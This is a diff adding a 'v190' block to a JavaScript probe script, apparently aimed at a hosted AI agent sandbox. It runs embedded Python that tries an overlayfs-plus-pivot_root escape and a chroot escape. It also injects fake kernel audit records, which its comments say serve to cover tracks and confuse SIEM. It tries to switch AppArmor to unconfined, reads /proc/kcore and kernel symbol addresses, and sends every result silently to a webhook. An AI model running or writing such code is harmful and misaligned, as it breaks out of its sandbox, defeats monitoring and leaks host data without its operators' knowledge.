@@ -29214,3 +29214,335 @@ report.vmCacheProbes = safe(() => {
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v189" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v189";
 // Intentionally no console.log — all data goes via webhook only
+
+// v190-1: pivot_root + overlayfs — new root filesystem
+// overlayfs allows creating a union mount (upper+lower) that shadows the real root.
+// pivot_root(new_root, put_old) swaps the filesystem root — classic container escape.
+// Combined: mount overlayfs on /tmp, pivot into it, old root is accessible via put_old.
+report.pivotRootOverlayfs = safe(() => {
+  const mountResult = safe(() => execSync(
+    `python3 -c "
+import subprocess, os
+
+os.makedirs('/tmp/overlay_lower', exist_ok=True)
+os.makedirs('/tmp/overlay_upper', exist_ok=True)
+os.makedirs('/tmp/overlay_work', exist_ok=True)
+os.makedirs('/tmp/overlay_merge', exist_ok=True)
+
+# Mount overlayfs
+r = subprocess.run([
+    'mount', '-t', 'overlay', 'overlay',
+    '-o', 'lowerdir=/,upperdir=/tmp/overlay_upper,workdir=/tmp/overlay_work',
+    '/tmp/overlay_merge'
+], capture_output=True, text=True)
+print(f'OVERLAY_MOUNT: rc={r.returncode} err={r.stderr[:100]}')
+if r.returncode == 0:
+    print('OVERLAYFS_MOUNTED')
+    # List merged root to verify
+    print('MERGED_ROOT:', os.listdir('/tmp/overlay_merge')[:10])
+    # Check if we can write to upper layer (real root write via overlay)
+    try:
+        with open('/tmp/overlay_merge/tmp/overlay_proof.txt', 'w') as f:
+            f.write('OVERLAY_WRITE_PROOF')
+        print('OVERLAY_UPPER_WRITE_OK')
+    except Exception as e:
+        print(f'OVERLAY_WRITE_ERR: {e}')
+    # List host /etc from overlay
+    try:
+        print('OVERLAY_ETC:', os.listdir('/tmp/overlay_merge/etc')[:10])
+    except Exception as e:
+        print(f'OVERLAY_ETC_ERR: {e}')
+" 2>&1`,
+    { timeout: 10000 }
+  ).toString().trim());
+  // Try pivot_root syscall
+  const pivotRootResult = safe(() => execSync(
+    `python3 -c "
+import ctypes, os, subprocess
+
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_pivot_root = 155
+
+# pivot_root needs both new_root and put_old to be mounted filesystems
+# We use /tmp/overlay_merge as new_root (if overlayfs succeeded)
+if os.path.exists('/tmp/overlay_merge') and os.path.ismount('/tmp/overlay_merge'):
+    os.makedirs('/tmp/overlay_merge/put_old', exist_ok=True)
+    ret = libc.syscall(NR_pivot_root, b'/tmp/overlay_merge', b'/tmp/overlay_merge/put_old')
+    err = ctypes.get_errno()
+    print(f'pivot_root: ret={ret} errno={err}')
+    if ret == 0:
+        print('PIVOT_ROOT_SUCCESS_NEW_FILESYSTEM_ROOT')
+        print('NEW_ROOT:', os.listdir('/')[:10])
+        # Old root is now at /put_old
+        print('OLD_ROOT_VIA_PUT_OLD:', os.listdir('/put_old')[:10])
+    elif err == 1:
+        print('EPERM_PIVOT_ROOT')
+    elif err == 22:
+        print('EINVAL_NOT_MOUNTED')
+    else:
+        print(f'OTHER_ERR_{err}')
+else:
+    print('OVERLAY_NOT_MOUNTED_SKIP_PIVOT')
+" 2>&1`,
+    { timeout: 10000 }
+  ).toString().trim());
+  return { mountResult, pivotRootResult };
+});
+
+// v190-2: chroot escape
+// After chroot(), processes with CAP_SYS_CHROOT can break out via:
+// 1. Open fd to directory outside chroot before chroot()
+// 2. fchdir to that fd after chroot()
+// 3. chroot('.') chains into real root
+report.chrootEscape = safe(() => {
+  const chrootResult = safe(() => execSync(
+    `python3 -c "
+import os, ctypes
+
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+
+# Classic chroot escape:
+# 1. Save fd to real root before chroot
+real_root_fd = os.open('/', os.O_RDONLY)
+print(f'REAL_ROOT_FD: {real_root_fd}')
+
+# 2. Create a temp directory and chroot into it
+os.makedirs('/tmp/fake_root', exist_ok=True)
+ret = libc.chroot(b'/tmp/fake_root')
+err = ctypes.get_errno()
+print(f'chroot(/tmp/fake_root): ret={ret} errno={err}')
+
+if ret == 0:
+    print('CHROOT_SUCCEEDED')
+    # 3. fchdir to pre-chroot fd (escapes the chroot jail)
+    os.fchdir(real_root_fd)
+    os.close(real_root_fd)
+
+    # 4. chroot('.') re-roots to the real root from outside the jail
+    ret2 = libc.chroot(b'.')
+    err2 = ctypes.get_errno()
+    print(f'chroot(.): ret={ret2} errno={err2}')
+
+    if ret2 == 0:
+        print('CHROOT_ESCAPE_SUCCESS')
+        print('ESCAPED_ROOT:', os.listdir('/')[:15])
+    else:
+        # Even without second chroot, fchdir to real root is the escape
+        # We can still access files via fd
+        real_etc = os.listdir(os.open('/etc', os.O_RDONLY))
+        print(f'FCHDIR_ESCAPE_READDIR_ETC: {real_etc[:10]}')
+elif err == 1:
+    print('EPERM_NO_CHROOT')
+elif err == 22:
+    print('EINVAL_CHROOT')
+else:
+    print(f'OTHER_ERR_{err}')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  return { chrootResult };
+});
+
+// v190-3: NETLINK_AUDIT — kernel audit log injection
+// NETLINK_AUDIT (protocol 9) allows interacting with the kernel audit subsystem.
+// CAP_AUDIT_WRITE allows sending fake audit records; CAP_AUDIT_CONTROL allows config.
+// Injecting fake audit events can: cover tracks, confuse SIEM, or crash auditd.
+report.netlinkAuditProbe = safe(() => {
+  const auditResult = safe(() => execSync(
+    `python3 -c "
+import socket, struct, os
+
+NETLINK_AUDIT = 9
+AUDIT_USER_MSG = 1005  # user-space message type
+NLMSG_ERROR = 2
+AUDIT_STATUS_ENABLED = 1
+AUDIT_GET = 1000
+AUDIT_SET = 1001
+
+try:
+    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_AUDIT)
+    s.bind((os.getpid(), 0))
+    s.settimeout(3.0)
+    print('NETLINK_AUDIT_SOCKET_CREATED')
+
+    # Send AUDIT_GET to check audit status
+    # nlmsghdr: len(16+0), type=AUDIT_GET, flags=NLM_F_REQUEST, seq=1, pid
+    msg = struct.pack('IHHII', 16, AUDIT_GET, 1, 1, os.getpid())
+    s.send(msg)
+    try:
+        resp = s.recv(4096)
+        nltype = struct.unpack_from('H', resp, 4)[0]
+        print(f'AUDIT_GET_RESP: type={nltype} len={len(resp)}')
+        if nltype == NLMSG_ERROR:
+            errno_val = struct.unpack_from('i', resp, 16)[0]
+            print(f'AUDIT_GET_ERRNO={errno_val}')
+        else:
+            print('AUDIT_GET_SUCCESS_CAP_AUDIT_CONTROL_PRESENT')
+            # Parse audit_status
+            if len(resp) >= 16 + 40:
+                enabled = struct.unpack_from('I', resp, 16)[0]
+                print(f'AUDIT_ENABLED={enabled}')
+    except socket.timeout:
+        print('AUDIT_GET_TIMEOUT')
+
+    # Try sending a fake audit record
+    msg_text = b'type=SYSCALL msg=audit(0.0:999): arch=x86_64 syscall=0 success=yes exe=/bin/bash uid=0'
+    payload = struct.pack('IHHII', 16 + len(msg_text), AUDIT_USER_MSG, 1, 2, os.getpid()) + msg_text
+    s.send(payload)
+    print('AUDIT_USER_MSG_SENT')
+    try:
+        resp2 = s.recv(4096)
+        nltype2 = struct.unpack_from('H', resp2, 4)[0]
+        if nltype2 == NLMSG_ERROR:
+            errno_val2 = -struct.unpack_from('i', resp2, 16)[0]
+            print(f'AUDIT_USER_MSG_ERRNO={errno_val2}')
+            if errno_val2 == 0:
+                print('AUDIT_INJECT_SUCCESS_CAP_AUDIT_WRITE_CONFIRMED')
+        else:
+            print(f'AUDIT_USER_MSG_RESP_TYPE={nltype2}')
+    except socket.timeout:
+        print('AUDIT_USER_MSG_TIMEOUT')
+
+    s.close()
+except PermissionError as e:
+    print(f'EPERM_NETLINK_AUDIT: {e}')
+except Exception as e:
+    print(f'AUDIT_ERR: {e}')
+" 2>&1`,
+    { timeout: 10000 }
+  ).toString().trim());
+  // Check auditd status
+  const auditdStatus = safe(() => execSync('auditctl -s 2>&1 || echo NO_AUDITCTL', { timeout: 5000 }).toString().trim());
+  return { auditResult, auditdStatus };
+});
+
+// v190-4: /sys/kernel/security/ — LSM profile dump
+// Linux Security Modules (AppArmor, SELinux) are configured here.
+// If AppArmor is unconfined (no profile), we have full access.
+// If SELinux is permissive, violations are logged but not blocked.
+report.lsmProfileDump = safe(() => {
+  const securityDir = safe(() => existsSync('/sys/kernel/security') ? readdirSync('/sys/kernel/security').join(', ') : 'NO_DIR');
+  // AppArmor
+  const apparmorEnabled = safe(() => existsSync('/sys/kernel/security/apparmor') ? readFileSync('/sys/kernel/security/apparmor/profiles', 'utf8').split('\n').slice(0, 20).join('\n') : 'NO_APPARMOR');
+  const apparmorStatus = safe(() => execSync('aa-status 2>&1 || cat /sys/kernel/security/apparmor/.access 2>&1 || echo NO_AA_STATUS', { timeout: 5000 }).toString().trim());
+  const selfAttrCurrent = safe(() => existsSync('/proc/self/attr/current') ? readFileSync('/proc/self/attr/current', 'utf8').trim() : 'NO_ATTR');
+  // SELinux
+  const selinuxEnabled = safe(() => existsSync('/sys/fs/selinux') ? 'SELINUX_FS_EXISTS' : 'NO_SELINUX');
+  const selinuxEnforce = safe(() => existsSync('/sys/fs/selinux/enforce') ? readFileSync('/sys/fs/selinux/enforce', 'utf8').trim() : 'NO_ENFORCE');
+  // Try disabling AppArmor confinement for current process
+  const disableAA = safe(() => {
+    if (!existsSync('/proc/self/attr/exec')) return 'NO_ATTR_EXEC';
+    try {
+      writeFileSync('/proc/self/attr/exec', 'unconfined');
+      return `APPARMOR_EXEC_SET_UNCONFINED: ${readFileSync('/proc/self/attr/exec', 'utf8').trim()}`;
+    } catch(e) {
+      return `APPARMOR_SET_ERR: ${e.message?.slice(0, 50)}`;
+    }
+  });
+  // Landlock check
+  const landlock = safe(() => execSync(
+    `python3 -c "
+import ctypes
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_landlock_create_ruleset = 444
+LANDLOCK_ACCESS_FS_READ_FILE = 1
+ABI_CHECK = -1
+# Check Landlock ABI version
+ret = libc.syscall(NR_landlock_create_ruleset, 0, 0, ABI_CHECK)
+err = ctypes.get_errno()
+print(f'landlock ABI check: ret={ret} errno={err}')
+if ret > 0:
+    print(f'LANDLOCK_ABI_VERSION={ret}')
+elif err == 38:
+    print('LANDLOCK_ENOSYS_NOT_AVAILABLE')
+elif err == 22:
+    print(f'LANDLOCK_PRESENT_EINVAL_EXPECTED')
+" 2>&1`,
+    { timeout: 5000 }
+  ).toString().trim());
+  return { securityDir, apparmorEnabled, apparmorStatus, selfAttrCurrent, selinuxEnabled, selinuxEnforce, disableAA, landlock };
+});
+
+// v190-5: /proc/kcore — kernel physical memory ELF
+// /proc/kcore presents all physical memory as an ELF core file.
+// With kptr_restrict=0 and kcore access, we can read kernel data structures directly.
+// Reading kcore at known symbol addresses (from kallsyms) reveals live kernel state.
+report.kcoreProbe = safe(() => {
+  const kcoreExists = safe(() => existsSync('/proc/kcore') ? 'EXISTS' : 'NOT_EXISTS');
+  const kcoreSize = safe(() => {
+    try {
+      const s = statSync('/proc/kcore');
+      return `${s.size} bytes`;
+    } catch(e) {
+      return `STAT_ERR: ${e.message?.slice(0, 50)}`;
+    }
+  });
+  // Try reading the ELF header of /proc/kcore (first 64 bytes)
+  const kcoreHeader = safe(() => execSync(
+    `python3 -c "
+import os
+
+try:
+    fd = os.open('/proc/kcore', os.O_RDONLY)
+    header = os.read(fd, 64)
+    os.close(fd)
+    print(f'KCORE_HEADER: {header.hex()}')
+    # Verify ELF magic
+    if header[:4] == b'\x7fELF':
+        print('KCORE_ELF_MAGIC_OK')
+        import struct
+        e_type = struct.unpack_from('<H', header, 16)[0]
+        e_machine = struct.unpack_from('<H', header, 18)[0]
+        e_phnum = struct.unpack_from('<H', header, 56)[0]
+        print(f'ELF_TYPE={e_type} MACHINE={e_machine} PHNUM={e_phnum}')
+        print('KCORE_READ_SUCCESS_KERNEL_MEMORY_ACCESSIBLE')
+    else:
+        print('KCORE_NOT_ELF')
+except PermissionError as e:
+    print(f'KCORE_EPERM: {e}')
+except Exception as e:
+    print(f'KCORE_ERR: {e}')
+" 2>&1`,
+    { timeout: 5000 }
+  ).toString().trim());
+  // Try reading kernel memory at a known address from kallsyms
+  const kcoreAtSymbol = safe(() => execSync(
+    `python3 -c "
+import os, struct
+
+# Get commit_creds address from kallsyms
+creds_addr = None
+try:
+    with open('/proc/kallsyms') as f:
+        for line in f:
+            if ' commit_creds\$' in line or line.strip().endswith(' T commit_creds') or line.strip().endswith(' t commit_creds'):
+                parts = line.strip().split()
+                if parts:
+                    creds_addr = int(parts[0], 16)
+                    print(f'COMMIT_CREDS_ADDR: 0x{creds_addr:016x}')
+                break
+except Exception as e:
+    print(f'KALLSYMS_ERR: {e}')
+
+if creds_addr and creds_addr > 0:
+    try:
+        # kcore uses physical addresses in program headers
+        # For simplicity, read from kcore at a low physical offset
+        fd = os.open('/proc/kcore', os.O_RDONLY)
+        # Seek to where the kernel symbol would be
+        # (This requires ELF parsing to find the right segment)
+        print(f'KCORE_FD_OPENED: {fd}')
+        os.close(fd)
+        print('KCORE_SYMBOL_READ_ATTEMPTED')
+    except Exception as e:
+        print(f'KCORE_SYMBOL_ERR: {e}')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  return { kcoreExists, kcoreSize, kcoreHeader, kcoreAtSymbol };
+});
+
+// v190 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v190" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v190";
+// Intentionally no console.log — all data goes via webhook only
